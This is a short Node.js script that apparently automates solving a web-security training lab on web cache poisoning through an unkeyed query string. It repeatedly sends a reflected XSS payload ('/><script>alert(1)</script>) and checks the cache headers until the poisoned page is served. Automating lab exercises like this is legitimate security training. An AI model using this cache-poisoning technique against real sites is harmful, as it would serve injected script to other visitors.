const { runLab, isSolved } = require('./_common.cjs');

const TITLE = 'Web cache poisoning via an unkeyed query string';
const PATH = '/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query';

async function waitSolved(page, labUrl, attempts = 10, delay = 5000) {
  for (let i = 0; i < attempts; i += 1) {
    if (await isSolved(page, labUrl)) return true;
    await page.waitForTimeout(delay);
  }
  return false;
}

runLab({
  title: TITLE,
  path: PATH,
  solve: async ({ page, labUrl }) => {
    page.on('dialog', (dialog) => dialog.accept().catch(() => {}));
    const payload = `/?evil='/><script>alert(1)</script>`;
    const buster = `https://${Date.now()}.example`;

    for (let i = 0; i < 12; i += 1) {
      const response = await fetch(labUrl + payload, {
        headers: { Origin: buster },
      });
      const body = await response.text();
      if (/hit/i.test(response.headers.get('x-cache') || '') && body.includes('<script>alert(1)</script>')) {
        break;
      }
    }

    for (let i = 0; i < 12; i += 1) {
      const response = await fetch(labUrl + '/', {
        headers: { Origin: buster },
      });
      const body = await response.text();
      if (body.includes('<script>alert(1)</script>')) {
        break;
      }
    }

    for (let i = 0; i < 25; i += 1) {
      await fetch(labUrl + payload);
      if (await waitSolved(page, labUrl, 1, 4000)) return;
    }

    await waitSolved(page, labUrl, 8, 5000);
  },
});
